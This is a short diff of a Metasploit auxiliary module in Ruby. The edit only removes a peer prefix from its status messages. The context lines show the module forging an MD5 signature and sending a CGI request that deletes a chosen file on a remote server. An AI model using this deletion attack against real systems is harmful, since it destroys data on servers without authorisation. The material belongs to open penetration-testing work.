@@ -45,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
     md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
     message = md5 + record
 
-    print_status("#{peer} - Trying to delete #{datastore['RPATH']}...")
+    print_status("Trying to delete #{datastore['RPATH']}...")
 
     res = send_request_cgi(
       {
@@ -57,9 +57,9 @@ class Metasploit3 < Msf::Auxiliary
       }, 5)
 
     if res and res.code == 200 and res.body =~ /<RESULT><VERSION>1<\/VERSION><STATUS>0<\/STATUS><TRANSID>0<\/TRANSID><\/RESULT>/
-      print_good("#{peer} - File #{datastore['RPATH']} successfully deleted")
+      print_good("File #{datastore['RPATH']} successfully deleted")
     else
-      print_error("#{peer} - File not deleted")
+      print_error("File not deleted")
     end
   end
 
